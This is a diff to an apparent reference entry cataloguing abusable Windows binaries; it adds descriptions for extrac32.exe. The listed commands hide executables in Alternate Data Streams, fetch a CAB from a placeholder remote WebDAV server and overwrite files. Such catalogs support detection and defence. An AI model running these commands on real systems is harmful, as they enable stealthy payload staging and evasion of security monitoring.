@@ -6,11 +6,11 @@ Created: '2018-05-25'
 Categories: []
 Commands:
   - Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
-    Description: ''
+    Description: 'Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.'
   - Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
-    Description: ''
+    Description: 'Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.'
   - Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
-    Description: ''
+    Description: 'Copy the source file to the destination file and overwrite it.'
 Full Path:
   - c:\windows\system32\extrac32.exe
   - c:\windows\sysWOW64\extrac32.exe
